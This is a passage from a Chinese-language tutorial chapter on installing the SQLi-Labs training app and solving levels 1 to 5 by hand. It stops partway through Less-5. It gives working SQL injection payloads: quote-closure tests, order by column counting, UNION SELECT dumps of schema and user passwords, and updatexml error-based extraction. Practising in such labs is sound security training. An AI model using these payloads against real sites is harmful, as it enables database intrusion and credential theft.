# 第13章 SQLi-Labs搭建与基础注入（Less1-10）🎯

> 第13章 | 难度：⭐⭐⭐ | 阅读时间：90分钟

---

## 📖 开篇引入：从"新手村"到"练功房"💪

哈喽，各位小伙伴们！欢迎来到第13章的学习！🎉

上一章我们在DVWA里初步体验了SQL注入，是不是感觉有点意思？但说实话，DVWA的SQL注入只能算是"开胃小菜"——就那么几个难度级别，打完就没了，总觉得还没过瘾对不对？

这就好比你学开车，在驾校的练车场里绕了几圈，觉得自己会开了。但真到了马路上，各种复杂路况一出来，你可能就懵了。🚗

那怎么办呢？**多练！** 而且要在各种不同的"路况"下练！

今天，我就给大家介绍一个SQL注入的"超级练功房"——**SQLi-Labs**！

### 先讲个生活小例子 🏋️

想象一下：
- 你想练肌肉，去健身房办了张卡
- 结果健身房里只有一个哑铃，重量还固定不变
- 你练了两天就觉得没意思了，因为太简单了，没挑战

这时候你需要什么？你需要一个**设备齐全的健身房**：
- 从轻到重各种重量的哑铃
- 练胸的、练背的、练腿的各种器械
- 有氧区、力量区、拉伸区...

**SQLi-Labs就是SQL注入界的"专业健身房"！** 🏋️‍♂️

它有整整 **75关**！从最简单的入门级，到烧脑的高级绕过，应有尽有。练完这75关，你的SQL注入水平绝对能上一个大台阶！

这一章，我们先从最基础的前10关开始，一步一步带你闯关！准备好了吗？Let's go！🚀

---

## 13.1 SQLi-Labs是什么？为什么要练它？🤔

### 13.1.1 SQLi-Labs简介

SQLi-Labs的全称是 **SQL Injection Labs**，翻译过来就是"SQL注入实验室"。

它是一个专门用来练习SQL注入的靶场，由安全爱好者 **Audi-1** 开发，开源在GitHub上。

用大白话讲：
> **SQLi-Labs就是一本厚厚的"SQL注入练习题集"，一共75道题，一道比一道难，做完你就入门了！** 📚

### 13.1.2 为什么要练SQLi-Labs？

可能你会问：DVWA不是已经有SQL注入了吗？为什么还要专门练SQLi-Labs？

问得好！我给你举几个理由：

**1️⃣ 题量大，练到手酸 💪**

DVWA的SQL注入就那么几个级别，三下五除二就打完了。但SQLi-Labs有 **75关**！从最简单的单引号注入，到各种WAF绕过，从GET型到POST型，从Cookie注入到二阶注入... 各种场景应有尽有。

就像学英语，你不能只背100个单词就说自己会英语了吧？得多背、多练、多接触不同的题型！

**2️⃣ 场景全，覆盖广泛 🌐**

真实世界里的SQL注入，可不是DVWA里那种"理想状态"。现实中你可能会遇到：
- 各种奇奇怪怪的闭合方式
- 没有数据回显的盲注
- 有WAF（Web应用防火墙）挡着
- 注入点在Cookie里、在HTTP头里...

SQLi-Labs把这些场景都模拟出来了，让你在"安全的实验室"里就能见识到各种"真实的套路"。

**3️⃣ 从易到难，循序渐进 📈**

SQLi-Labs的关卡设计是有梯度的：
- Less1-10：基础注入（入门级）
- Less11-25：POST注入、Cookie注入等（进阶级）
- Less26-50：各种绕过技巧（高级）
- Less51-75：更复杂的场景（大师级）

就像打游戏通关，从新手村一路打到Boss关，成就感满满！🎮

**4️⃣ 经典中的经典，必刷题库 ⭐**

在Web安全圈，SQLi-Labs的地位就像是：
- 学编程必刷的LeetCode
- 考驾照必做的科目一题库
- 学英语必备的牛津词典

几乎所有搞Web安全的人，都刷过SQLi-Labs。你要是说自己没刷过，都不好意思跟人打招呼！😏

### 13.1.3 学习建议：怎么刷才最高效？💡

在开始之前，我给大家几条"闯关秘籍"：

**秘籍一：先手工，后工具 🖐️ → 🔧**

很多新手一上来就用SQLmap一把梭，爽是爽了，但啥也没学会。

我建议：
- **前20关：纯手工注入**，一行一行自己写payload
- 20关以后：实在搞不定了再用工具辅助
- 全部刷完一遍：再用SQLmap重新刷一遍，对比思路

为什么要这样？因为手工注入能让你真正理解原理。就像学数学，你得先会手算，才能用计算器。如果一上来就用计算器，你永远学不会数学！

**秘籍二：一关一关打，不要跳关 🎮**

不要觉得某一关简单就跳过，也不要因为某一关难就去看答案。

SQLi-Labs的关卡设计是有逻辑的，前面的关卡是后面的基础。一步一个脚印，稳扎稳打才是王道！

**秘籍三：多思考，多总结 🧠**

每打完一关，问问自己：
- 这一关的考点是什么？
- 我是怎么找到注入点的？
- 用了什么注入技术？
- 如果换一种方式，能不能打进去？

好记性不如烂笔头，建议大家准备一个笔记本（或者电子文档），把每一关的思路和payload都记下来。以后忘了，翻一翻就想起来了！

**秘籍四：搞不定就放一放，回头再看 🔄**

有些关卡可能比较难，你卡了好几个小时都没思路。这时候别死磕，先放一放，去打打别的关卡，或者出去散散步。

很多时候，你睡一觉起来，第二天再看，突然就想通了！学习就是这么神奇的事儿~ 😴

---

## 13.2 环境搭建：把SQLi-Labs装起来 🛠️

好了，废话不多说，我们开始搭建环境！

搭建SQLi-Labs非常简单，跟DVWA差不多，都是PHP+MySQL的架构，用我们之前装的PHPStudy就能跑。

### 13.2.1 下载SQLi-Labs 📥

SQLi-Labs是开源的，我们可以从GitHub上下载。

**下载地址：**
```
https://github.com/Audi-1/sqli-labs
```

如果你访问GitHub比较慢，也可以搜索"sqli-labs 下载"，找国内的镜像站下载。

下载下来是一个压缩包，大概几MB的样子，很小。

### 13.2.2 部署到PHPStudy 🌐

下载完之后，我们把它部署到PHPStudy的WWW目录下。

步骤如下：

1. **解压压缩包**
   - 右键点击下载的压缩包，选择"解压到当前文件夹"
   - 解压后你会得到一个 `sqli-labs-master` 文件夹

2. **重命名文件夹（可选）**
   - 为了方便访问，你可以把 `sqli-labs-master` 改成 `sqli-labs`
   - 当然不改也行，就是访问的时候网址长一点

3. **放到WWW目录下**
   - 打开PHPStudy的WWW目录
   - 如果你是默认安装的，路径一般是：`C:\phpstudy_pro\WWW`
   - 把 `sqli-labs` 文件夹复制进去

就这么简单！代码部署完成了！✅

### 13.2.3 修改数据库配置 ⚙️

接下来我们需要配置一下数据库连接信息，让SQLi-Labs能连上我们的MySQL。

找到这个文件：
```
sqli-labs/sql-connections/db-creds.inc
```

用记事本或者VS Code打开它，内容大概是这样的：

```php
<?php
$dbuser = 'root';      // 数据库用户名
$dbpass = 'your_password';  // 数据库密码
$dbname = 'security';  // 数据库名
$host = 'localhost';   // 主机地址
?>
```

你需要修改的是 **数据库密码**，改成你PHPStudy里MySQL的root密码。

如果你没改过密码，PHPStudy默认的MySQL密码一般是：
- 老版本：`root`
- 新版本：`root` 或者空

> 💡 **小提示**：不知道密码的话，打开PHPStudy，在"数据库"选项卡里就能看到用户名和密码。

改完之后保存文件。

### 13.2.4 初始化数据库 🗃️

配置改好了，现在我们来初始化数据库。

1. **确保PHPStudy启动了**
   - 打开PHPStudy
   - 确保Apache（或Nginx）和MySQL都在运行状态

2. **在浏览器访问安装页面**
   - 打开浏览器，访问：`http://localhost/sqli-labs/`
   - （如果你文件夹名不一样，就改成对应的名字）

3. **点击安装链接**
   - 进入首页后，你会看到一个链接：
     **"Setup/reset Database for labs"**
   - 点它！

4. **等待初始化完成**
   - 点击之后，系统会自动创建数据库、创建表、插入测试数据
   - 如果一切顺利，你会看到一堆绿色的提示，告诉你创建成功了

如果看到红色的错误，别慌，大概率是数据库密码没配对，回去检查一下 `db-creds.inc` 文件。

### 13.2.5 验证成功 ✅

数据库初始化完成后，我们回到首页：
```
http://localhost/sqli-labs/
```

你应该能看到一个关卡列表页面，从Less-1到Less-75，整整齐齐地排列着。

每一关都是一个链接，点进去就能开始挑战！

看到这个页面，恭喜你！🎉 **SQLi-Labs搭建成功了！**

### 13.2.6 界面介绍 🖥️

在开始闯关之前，我们先熟悉一下界面：

- **首页**：所有关卡的列表，点击关卡名称进入
- **关卡页面**：每一关都有一个简单的介绍，告诉你这一关的类型
- **页面内容**：大部分关卡都是一个输入框，让你输入ID进行查询
- **SQL查询**：有些关卡会在页面底部显示执行的SQL语句（方便你学习）

> 💡 **小提示**：如果页面底部显示了SQL语句，那简直就是"开卷考试"啊！你可以直接看到SQL是怎么写的，对你理解注入原理非常有帮助。

---

## 13.3 闯关前的准备：知识复习 📝

在开始闯关之前，我们先复习一下SQL注入的基础知识。老话说得好：**磨刀不误砍柴工！** 🔪

### 13.3.1 手工注入的一般步骤

SQL注入虽然花样多，但总体思路是差不多的。一般来说，我们的目标是：
**拿到数据库里的敏感数据，比如管理员的用户名和密码。**

为了达到这个目标，我们通常按这个步骤来：

```
1. 找注入点 → 2. 判断注入类型 → 3. 猜字段数 → 4. 找显示位 → 5. 爆库 → 6. 爆表 → 7. 爆字段 → 8. 爆数据
```

就像剥洋葱，一层一层往里深入！🧅

### 13.3.2 常用函数复习

SQL注入里有几个常用的函数，我们来复习一下：

**1. version() —— 数据库版本**
- 作用：返回当前MySQL的版本号
- 例子：`SELECT version();` → 可能返回 `5.7.26`

**2. database() —— 当前数据库名**
- 作用：返回当前正在使用的数据库名
- 例子：`SELECT database();` → 可能返回 `security`

**3. user() —— 当前用户**
- 作用：返回当前连接数据库的用户名
- 例子：`SELECT user();` → 可能返回 `root@localhost`

**4. group_concat() —— 把多行拼成一行**
- 作用：把多行查询结果拼成一个字符串，用逗号分隔
- 这个函数超级有用！因为我们的显示位通常只有一个，用它就能一次把所有数据都显示出来
- 例子：`SELECT group_concat(username) FROM users;` → 会返回所有用户名，用逗号隔开

**5. concat() —— 拼接字符串**
- 作用：把多个字符串拼在一起
- 例子：`SELECT concat(username, '---', password) FROM users;` → 把用户名和密码拼在一起显示

**6. substr() —— 截取字符串**
- 作用：从字符串中截取一部分
- 格式：`substr(字符串, 起始位置, 长度)`
- 例子：`SELECT substr('abcde', 2, 3);` → 返回 `bcd`（从第2个字符开始，取3个）

**7. ascii() —— 转ASCII码**
- 作用：把字符转换成ASCII码
- 例子：`SELECT ascii('a');` → 返回 `97`

**8. length() —— 字符串长度**
- 作用：返回字符串的长度
- 例子：`SELECT length('abc');` → 返回 `3`

**9. sleep() —— 延时**
- 作用：让数据库休眠指定的秒数
- 例子：`SELECT sleep(5);` → 数据库会停5秒再返回结果

**10. if() —— 条件判断**
- 作用：如果条件成立，返回第二个参数，否则返回第三个
- 格式：`if(条件, 成立时返回, 不成立时返回)`
- 例子：`SELECT if(1=1, '对', '错');` → 返回 `'对'`

这些函数非常重要，后面的关卡里我们会反复用到！

### 13.3.3 information_schema 是什么？

在SQL注入中，`information_schema` 是一个非常重要的数据库。

你可以把它理解为 **"数据字典"** 或者 **"数据库的目录"**。📖

它里面存着所有数据库的信息：
- 有哪些数据库？
- 每个数据库里有哪些表？
- 每个表里有哪些字段？

当我们想"脱库"（把所有数据都搞出来）的时候，就需要先从 `information_schema` 里查到库名、表名、字段名，然后才能去查具体的数据。

几个关键的表：
- **information_schema.schemata**：存着所有数据库名（schema_name字段）
- **information_schema.tables**：存着所有表名（table_schema是数据库名，table_name是表名）
- **information_schema.columns**：存着所有字段名（column_name是字段名）

记住这三个表，注入的时候经常用！

---

## 13.4 Less-1：GET - 单引号 - 字符型 - 报错注入 🌟

好了，准备工作做完了，我们开始闯第一关！

第一关是最简单的，也是最经典的，我们会讲得非常详细。把第一关搞明白了，后面的关卡就一通百通了！

### 13.4.1 进入第一关

打开浏览器，访问：
```
http://localhost/sqli-labs/Less-1/
```

你会看到一个简单的页面，提示你输入ID。我们先在URL后面加个 `?id=1` 试试：

```
http://localhost/sqli-labs/Less-1/?id=1
```

页面显示了用户名和密码：
- Your Login name: Dumb
- Your Password: Dumb

正常显示，说明我们输入的ID生效了！✅

### 13.4.2 第一步：测试注入点 🔍

现在我们来测试一下，这个地方有没有SQL注入漏洞。

怎么测试呢？最简单的方法就是：**加个单引号试试！**

访问：
```
http://localhost/sqli-labs/Less-1/?id=1'
```

> 💡 **注意**：URL里的单引号有时候会被编码，不过没关系，浏览器会自动处理的。

页面返回了一个错误：
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```

哇，报错了！而且把SQL语句的错误信息都显示出来了！

这说明什么？说明 **这里存在SQL注入漏洞！** 🎉

### 为什么加单引号会报错？🤔

我来给你解释一下原理。

正常情况下，后端的SQL语句大概是这样的：
```sql
SELECT * FROM users WHERE id = '1' LIMIT 0,1
```

注意看，id的值是被**单引号**包裹着的，因为它是一个**字符串类型**。

当我们输入 `1'` 的时候，SQL语句就变成了：
```sql
SELECT * FROM users WHERE id = '1'' LIMIT 0,1
```

看到问题了吗？我们输入的单引号把原来的单引号给"闭合"了，后面又多出来一个单引号，导致SQL语法错误，所以数据库就报错了！

打个比方：
- 原句：我去商店买'苹果'
- 你输入：苹果'
- 变成：我去商店买'苹果''  ← 多了一个引号，句子不通了

就是这么简单！

### 13.4.3 第二步：判断注入类型 🎯

既然有注入，那我们接下来要判断：**是什么类型的注入？**

SQL注入主要分两大类型：
1. **数字型**：id是数字，不需要引号包裹
2. **字符型**：id是字符串，需要引号包裹

怎么判断呢？我们可以用 `and 1=1` 和 `and 1=2` 来测试。

不过在此之前，我们得先把SQL语句"拼接正确"，也就是把后面的引号给注释掉。

#### 注释符怎么用？📝

MySQL里有几种注释方式：
- `-- `：双减号加空格（注意后面必须有空格！）
- `#`：井号
- `/* */`：多行注释

在URL里，我们常用 `--+`，因为URL里的加号会被解析成空格，所以 `--+` 就相当于 `-- `（双减号加空格）。

好，我们来试试：

```
http://localhost/sqli-labs/Less-1/?id=1' and 1=1--+
```

页面正常显示了！✅

再试试：
```
http://localhost/sqli-labs/Less-1/?id=1' and 1=2--+
```

页面没有显示数据，不正常了！❌

这说明什么？说明我们的注入语句成功执行了！

**原理分析：**
- `and 1=1`：条件永远成立，所以正常显示
- `and 1=2`：条件永远不成立，所以不显示数据

这就证明了：**这里是字符型注入，用单引号闭合！**

> 💡 **生活小例子**：这就像你去电影院，票上写着"1排1座"。你跟检票员说"1排1座，而且我是你老板"，如果检票员真信了就让你进去了；你说"1排1座，而且我是外星人"，他就不让你进。这说明检票员真的在判断你说的话！

### 13.4.4 第三步：猜字段数 🔢

接下来，我们需要知道这个查询语句返回了**几个字段**（几列数据）。

为什么要知道这个？因为后面我们要用 `union select` 联合查询，两个查询的字段数必须一样，不然会报错。

怎么猜呢？用 `order by`！

#### order by 是什么？🤔

`order by` 本来是用来排序的，比如 `order by 1` 就是按第1个字段排序。

如果我们写 `order by 3`，而查询只有2个字段，那就会报错，因为找不到第3个字段。

利用这个特性，我们就可以猜出字段数！

好，我们来试：

```
http://localhost/sqli-labs/Less-1/?id=1' order by 1--+
```
正常，说明至少有1个字段。

```
http://localhost/sqli-labs/Less-1/?id=1' order by 2--+
```
正常，至少2个。

```
http://localhost/sqli-labs/Less-1/?id=1' order by 3--+
```
正常，至少3个。

```
http://localhost/sqli-labs/Less-1/?id=1' order by 4--+
```
报错了！说 `Unknown column '4' in 'order clause'`

这说明什么？说明 **查询结果有3个字段！** ✅

因为order by 3正常，order by 4报错，所以字段数是3。

> 💡 **小技巧**：如果字段数很多，一个个试太慢了。可以用"二分法"，比如先试10，如果正常再试20，如果报错就试5，这样能快速缩小范围。

### 13.4.5 第四步：找显示位 🎯

知道了有3个字段，接下来我们用 `union select` 来看看哪些字段会显示在页面上。

#### union select 是什么？🤔

`union` 是"联合"的意思，`union select` 可以把两个查询的结果拼在一起。

比如：
```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
就会把两个查询的结果合并成一个结果集返回。

注意：两个查询的字段数必须一样！

好，我们来构造payload：

```
http://localhost/sqli-labs/Less-1/?id=1' union select 1,2,3--+
```

等等，页面怎么还是显示原来的数据？没有显示我们的1,2,3啊？

哦，因为 `id=1` 有数据，页面只显示第一行的结果。我们需要让前面的查询不返回数据，这样 union 后面的内容才能显示出来。

怎么让前面不返回数据？很简单，给个不存在的id就行了，比如 `id=-1`：

```
http://localhost/sqli-labs/Less-1/?id=-1' union select 1,2,3--+
```

看！页面上显示了 **Your Login name: 2** 和 **Your Password: 3**！

这说明什么？说明：
- **第2个字段**显示在"Login name"的位置
- **第3个字段**显示在"Password"的位置

第1个字段呢？没显示，可能是用在别的地方了，或者被隐藏了。没关系，我们有两个显示位，够用了！

这些会显示数据的位置，我们就叫它 **"显示位"**。

### 13.4.6 第五步：爆数据库名 🗄️

有了显示位，我们就可以开始"爆数据"了！

先从最简单的开始：**当前数据库叫什么名字？**

我们用 `database()` 函数，把它放到第2位或者第3位都行。

试试：
```
http://localhost/sqli-labs/Less-1/?id=-1' union select 1,database(),3--+
```

页面显示：
- Your Login name: **security**
- Your Password: 3

太棒了！我们得到了当前数据库名：**security**！🎉

### 13.4.7 第六步：爆表名 📋

知道了数据库名，接下来我们要查：**这个数据库里有哪些表？**

这时候就需要用到 `information_schema.tables` 了！

我们来构造查询：
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = 'security'
```

啥意思呢？大白话翻译：
- 从 `information_schema.tables` 这个表里
- 查所有 `table_schema`（数据库名）等于 `security` 的
- 把 `table_name`（表名）给我列出来

把这个放到我们的注入语句里：

```
http://localhost/sqli-labs/Less-1/?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema='security'--+
```

等等，页面只显示了一个表名：**emails**

但security数据库里肯定不止一个表啊！怎么只显示了一个？

因为我们的显示位只有一个，它只能显示第一行结果。

那怎么把所有表名都显示出来呢？用 `group_concat()` 函数！

#### group_concat() 登场！🎊

`group_concat()` 可以把多行结果拼成一行，用逗号分隔。这样我们就能一次看到所有表名了！

改进一下：
```
http://localhost/sqli-labs/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+
```

看！页面显示：
- Your Login name: **emails,referers,uagents,users**

太棒了！四个表名全出来了！🎉

- emails：邮件表
- referers：引用来源表
- uagents：用户代理表
- **users**：用户表（这就是我们想要的！里面存着用户名和密码）

### 13.4.8 第七步：爆字段名 📝

找到了users表，接下来我们要查：**users表里有哪些字段？**

这次我们查 `information_schema.columns`：

```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'users'
```

翻译成人话：
- 从 `information_schema.columns` 表里
- 查所有表名是 `users` 的
- 把字段名列出来

继续构造payload：

```
http://localhost/sqli-labs/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
```

页面显示：
- Your Login name: **id,username,password**

完美！users表里有三个字段：
- **id**：用户ID
- **username**：用户名
- **password**：密码

这正是我们想要的！🎯

### 13.4.9 第八步：爆数据 💥

好了，现在库名、表名、字段名都有了，最后一步：**把数据爆出来！**

我们要查 users 表里的 username 和 password。

构造查询：
```sql
SELECT username, password FROM users
```

等等，我们有两个显示位（第2位和第3位），刚好可以一个放用户名，一个放密码！

payload：
```
http://localhost/sqli-labs/Less-1/?id=-1' union select 1,username,password from users--+
```

页面显示：
- Your Login name: **Dumb**
- Your Password: **Dumb**

哎，怎么只有一个用户？还是因为只显示第一行啊！

没事，我们用 `group_concat` 把所有用户名和密码都拼起来。

为了看得更清楚，我们用 `concat` 把用户名和密码拼在一起，中间加个分隔符：

```
http://localhost/sqli-labs/Less-1/?id=-1' union select 1,group_concat(concat(username,'---',password)),3 from users--+
```

页面显示：
```
Your Login name: Dumb---Dumb, Angelina---I-kill-you, Dummy---p@ssword, secure---crappy, stupid---stupidity, superman---genious, batman---mob!le, admin---admin, admin1---admin1, admin2---admin2, admin3---admin3, dhakkan---dumbo
```

我的天！所有的用户名和密码都出来了！🎉🎉🎉

数一数，有13个用户呢！我们找到了管理员账户：
- **admin / admin**
- **admin1 / admin1**
- ...

Less-1，通关！✅

> 💡 **成就感满满吧？** 这就是SQL注入的魅力！从一个小小的输入点，一步一步把整个数据库都"扒光"了。是不是有点小激动？

### 13.4.10 Less-1 总结

Less-1 是最经典的 **GET型单引号字符型注入**，我们用了 **联合查询注入** 的方法。

完整流程回顾：
1. `id=1'` 报错 → 发现注入点
2. `id=1' and 1=1--+` 正常，`id=1' and 1=2--+` 不正常 → 确认是字符型注入，单引号闭合
3. `order by 3` 正常，`order by 4` 报错 → 字段数是3
4. `id=-1' union select 1,2,3--+` → 找到显示位2和3
5. 爆库：`database()` → security
6. 爆表：`information_schema.tables` → emails, referers, uagents, users
7. 爆字段：`information_schema.columns` → id, username, password
8. 爆数据：查询users表 → 拿到所有用户名密码

把这个流程记牢，后面很多关卡都是这个套路！

---

## 13.5 Less-2：GET - 数字型 - 报错注入 🔢

好，我们继续闯第二关！

### 13.5.1 测试注入点

老规矩，先加单引号试试：

```
http://localhost/sqli-labs/Less-2/?id=1'
```

果然报错了。但这次的报错信息有点不一样：
```
...near '' LIMIT 0,1' at line 1
```

你对比一下Less-1的报错，发现了吗？Less-1报错是 `'1''`，这里只有一个 `'`。

这说明什么？说明 **Less-2可能是数字型注入**，id没有被引号包裹。

我们来验证一下。

### 13.5.2 判断注入类型

数字型注入的话，不需要单引号闭合，直接在id后面加语句就行。

试试：
```
http://localhost/sqli-labs/Less-2/?id=1 and 1=1
```
正常显示。✅

```
http://localhost/sqli-labs/Less-2/?id=1 and 1=2
```
不显示数据了。❌

完美！这就是 **数字型注入**！

> 💡 **为什么叫数字型？** 因为id是数字，SQL语句里不需要用引号包裹。就像 `SELECT * FROM users WHERE id = 1`，而不是 `id = '1'`。

### 13.5.3 后面的步骤都一样

确认了是数字型注入，而且不需要引号闭合，后面的步骤就和Less-1一模一样了！

- 猜字段数：`order by 3` → 3个字段
- 找显示位：`id=-1 union select 1,2,3` → 显示位2和3
- 爆库、爆表、爆字段、爆数据：都一样

我就不重复演示了，大家自己动手试试！

**payload示例：**
```
http://localhost/sqli-labs/Less-2/?id=-1 union select 1,group_concat(concat(username,'---',password)),3 from users--+
```

Less-2，通关！✅

### 13.5.4 Less-2 总结

Less-2 和 Less-1 的唯一区别就是：
- Less-1：字符型，单引号闭合，payload 是 `1' ... --+`
- Less-2：数字型，不需要引号，payload 是 `1 ... --+`

其他步骤完全一样！

> 💡 **看到了吧？** SQL注入的核心思路是一样的，只是闭合方式不同而已。就像开门，有的门用钥匙开，有的门用密码开，有的门用指纹开，但目的都是"进门"。

---

## 13.6 Less-3：GET - 单引号+括号 - 字符型 - 报错注入 📦

继续第三关！

### 13.6.1 测试注入点

老规矩，先加单引号：

```
http://localhost/sqli-labs/Less-3/?id=1'
```

报错了，看看报错信息：
```
...near ''1'') LIMIT 0,1' at line 1
```

哎？这个报错有点特别，里面有个 `'1'')`。

我们来分析一下：
- 我们输入的是 `1'`
- 报错里显示的是 `'1'')`
- 说明SQL语句大概是这样的：`WHERE id = ('1') LIMIT 0,1`
- 我们输入的单引号闭合了前面的单引号，但后面还有一个括号

所以，闭合方式应该是 **单引号+括号**，也就是 `')`！

### 13.6.2 验证闭合方式

我们来试试：
```
http://localhost/sqli-labs/Less-3/?id=1') and 1=1--+
```

正常显示！✅

再试：
```
http://localhost/sqli-labs/Less-3/?id=1') and 1=2--+
```

不显示了！❌

完美！确认了，闭合方式是 **单引号加括号 `')`**。

### 13.6.3 后面都一样

确认了闭合方式，后面的步骤就又一样啦！

- `order by 3` → 3个字段
- 找显示位 → 2和3
- 爆库爆表爆数据 → 都一样

**payload示例：**
```
http://localhost/sqli-labs/Less-3/?id=-1') union select 1,group_concat(concat(username,'---',password)),3 from users--+
```

Less-3，通关！✅

### 13.6.4 Less-3 总结

Less-3 的特点是：**闭合方式是单引号+括号 `')`**。

为什么会有这种写法？因为程序员可能写了这样的SQL：
```php
$sql = "SELECT * FROM users WHERE id = ('$id') LIMIT 0,1";
```

看到了吧，id外面不仅有单引号，还有一层括号。所以我们闭合的时候，也要把括号考虑进去。

> 💡 **小技巧**：遇到注入点不知道怎么闭合怎么办？看报错信息！报错信息里通常会泄露SQL语句的结构，帮你判断闭合方式。

---

## 13.7 Less-4：GET - 双引号+括号 - 字符型 - 报错注入 🔠

第四关来了！

### 13.7.1 测试注入点

先加单引号试试：
```
http://localhost/sqli-labs/Less-4/?id=1'
```

咦？加单引号竟然没报错？正常显示了！

这说明什么？说明 **可能不是单引号闭合**。

那试试双引号：
```
http://localhost/sqli-labs/Less-4/?id=1"
```

报错了！看看报错信息：
```
...near '"1"") LIMIT 0,1' at line 1
```

双引号、括号... 看起来和Less-3很像，只不过单引号换成了双引号！

### 13.7.2 验证闭合方式

我们猜测闭合方式是 `")`（双引号+括号），来验证一下：

```
http://localhost/sqli-labs/Less-4/?id=1") and 1=1--+
```
正常！✅

```
http://localhost/sqli-labs/Less-4/?id=1") and 1=2--+
```
不正常！❌

完美！确认了，闭合方式是 **双引号加括号 `")`**。

### 13.7.3 后面都一样

老规矩，后面步骤都一样，直接上最终payload：

```
http://localhost/sqli-labs/Less-4/?id=-1") union select 1,group_concat(concat(username,'---',password)),3 from users--+
```

Less-4，通关！✅

### 13.7.4 Less-4 总结

Less-4 和 Less-3 几乎一样，只是把单引号换成了双引号：
- Less-3：`')` 闭合
- Less-4：`")` 闭合

到这里你可能发现了，这几关的套路都一样，只是闭合方式不同而已。

就像开门：
- 有的门用钥匙（单引号）
- 有的门用密码（数字型）
- 有的门用钥匙+保险（单引号+括号）
- 有的门用密码+保险（双引号+括号）

但只要门开了，里面的东西都是一样的！🔓

---

## 13.8 Less-5：GET - 双查询注入 - 单引号 - 字符型 ⚠️

好，第五关来了！这一关开始，我们要接触一种新的注入方式了！

### 13.8.1 看看这关有什么不一样

老规矩，先访问：
```
http://localhost/sqli-labs/Less-5/?id=1
```

页面显示：**You are in...........**

哎？怎么只显示了这么一句话？没有显示用户名和密码？

我们再加个单引号试试：
```
http://localhost/sqli-labs/Less-5/?id=1'
```

报错了！说明还是有注入点的。

但是... 正常访问的时候，页面不显示查询结果啊！那我们怎么用 union select？就算查到了数据，也显示不出来啊！

这就是这一关的难点：**没有数据回显，但是有报错信息。**

这种情况怎么办呢？我们可以用 **报错注入**！

### 13.8.2 什么是报错注入？🤔

报错注入，顾名思义，就是 **利用数据库的报错信息，把我们想要的数据"带出来"**。

打个比方：
- 普通注入：就像你去银行，柜员直接把余额告诉你
- 报错注入：就像柜员不肯告诉你余额，但你故意说了句错话，柜员生气地喊"你说什么？我们余额明明是XXX，你怎么说是YYY！" —— 你从他的抱怨里听到了余额！😏

听起来有点绕？没关系，我们一步一步来。

### 13.8.3 报错注入的原理

MySQL里有一些函数，如果使用不当（或者说"使用得当"😏），就会产生报错，而且报错信息里会包含我们想要的数据。

常用的报错函数有：
- `updatexml()`
- `extractvalue()`
- `count() + rand() + group by`（双查询注入）

我们今天重点讲 `updatexml()`，因为它最简单、最好用！

#### updatexml() 是什么？

`updatexml()` 是MySQL的一个函数，用来更新XML文档。

它的语法是：
```sql
UPDATEXML(XML文档, XPath路径, 新值)
```

如果XPath路径的格式不对，MySQL就会报错，而且**会把XPath路径的内容显示在报错信息里**。

我们就利用这一点！把我们想要查的数据放在XPath的位置，故意构造错误的格式，让数据库报错，数据就跟着报错信息出来了！

> 💡 **生活小例子**：这就像你让一个人传话，你故意把话说得很奇怪，他会重复你的话然后说"你说的啥玩意儿？"，这样他就把你的话"复述"了一遍。

### 13.8.4 用 updatexml 爆库名

好，我们来实操一下！

首先，确认一下这一关是单引号闭合：

```
http://localhost/sqli-labs/Less-5/?id=1' and 1=1--+
```
正常，显示 "You are in..........."

```
http://localhost/sqli-labs/Less-5/?id=1' and 1=2--+
```
不显示 "You are in..........." 了（或者显示不正常）

确认了，单引号字符型注入。

现在我们用 updatexml 来爆库名：

**payload格式：**
```sql
1' and updatexml(1,concat(0x7e, database(), 0x7e),1)--+
```

啥意思呢？我来解释一下：
- `updatexml(1, ... ,1)`：调用updatexml函数，第一个和第三个参数随便写
- `concat(0x7e, database(), 0x7e)`：把 `~`（0x7e是~的十六进制）、数据库名、`~` 拼在一起
- 为什么加 `~`？因为XPath路径不能以特殊字符开头，加个~让格式"看起来不对"，才能触发报错

我们来试试：

```
http://localhost/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1)--+
```

看！报错信息出来了：
```
XPATH syntax error: '~security~'
```

哇！数据库名 **security** 就在报错信息里！🎉

是不是很神奇？

### 13.8.5 用 updatexml 爆表名

接下来爆表名，一样的套路，把 `database()` 换成查询表名的语句就行。

注意：因为 updatexml 一次只能显示一行（其实是报错信息长度有限），所以我们不能直接用 group_concat（数据太多显示不全），我们可以一个一个来。

先查第一个表：
```sql
1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1)--+
```

解释一下：
- `limit 0,1`：从第0行开始，取1行（也就是第一个表）

访问：
```
http://localhost/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1)--+
```

报错显示：
```
XPATH syntax error: '~emails~'
```
第一个表是 emails。

第二个表（把limit 0,1改成limit 1,1）：
```
http://localhost/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 1,1),0x7e),1)--+
```
→ referers

第三个：
```
http://localhost/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 2,1),0x7e),1)--+
```
→ uagents

第四个：
```
http://localhost/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x7e),1)--+
```
→ **users**

找到了users表！✅

> 💡 **小技巧**：如果你想用 group_concat 一次查所有表，也是可以的，但 updatexml 有长度限制（最多显示32个字符左右），数据多了会被截断。这时候就需要用 `limit` 一个一个查，或者用 `substr` 分段截取。

### 13.8.6 用 updatexml 爆字段名

找到了users表，接下来爆字段。

第一个字段：
```
http://localhost/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e),1)--+
```
→ id

第二个：
```
http://localhost/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 1,1),0x7e),1)--+
```
→ username

第三个：
```
